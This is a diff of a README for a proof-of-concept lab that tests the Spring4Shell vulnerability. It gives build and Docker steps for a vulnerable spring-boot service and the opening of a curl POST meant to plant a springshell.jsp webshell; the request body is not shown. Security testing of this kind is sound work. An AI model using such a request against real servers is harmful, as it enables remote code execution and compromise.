@@ -3,7 +3,7 @@ This is a POC to test spring shell vulnerability in a spring-boot app on multipl
 
 
 ## Step 1: Prepare vulnerable service
-Below are 2 paths to create a service. One is a spring-boot WAR running on Tomcat and the other is a standalone spring-boot jar executable
+Below are 2 paths to create a service. One is a spring-boot WAR running on standalone Tomcat and the other is a spring-boot jar executable
 
 ### spring-boot WAR on tomcat
 1. Run command to:
@@ -38,7 +38,7 @@ curl --request POST \
     - Create a container from the image        
       `mvn clean package && docker build . -t springshell && docker run --name springshell --rm -p 8080:8080 springshell`
 2. Run curl command that attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp name is springshell.jsp
-    1. If the jsp is not created, there is no vulnerability
+    1. If the jsp is not created, _the application is not compromised_
 ```
 curl --request POST \
   --url http://localhost:8080/zeroday \
